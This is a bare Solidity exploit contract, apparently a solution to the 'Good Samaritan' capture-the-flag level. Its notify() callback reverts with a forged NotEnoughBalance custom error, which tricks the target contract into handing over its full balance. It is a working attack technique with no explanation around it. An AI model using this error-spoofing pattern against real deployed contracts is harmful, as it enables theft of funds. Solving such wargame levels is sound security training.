// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract BadSamaritan {
    error NotEnoughBalance();
    IGoodSamaritan public goodSam;

    constructor(address _goodSamaritan) {
        goodSam = IGoodSamaritan(_goodSamaritan);
    }

    function notify(uint _amount) external {
        if(_amount <= 10){
            revert NotEnoughBalance();
        }
    }

    function hackSamaritan() external {
        goodSam.requestDonation();
    }

}
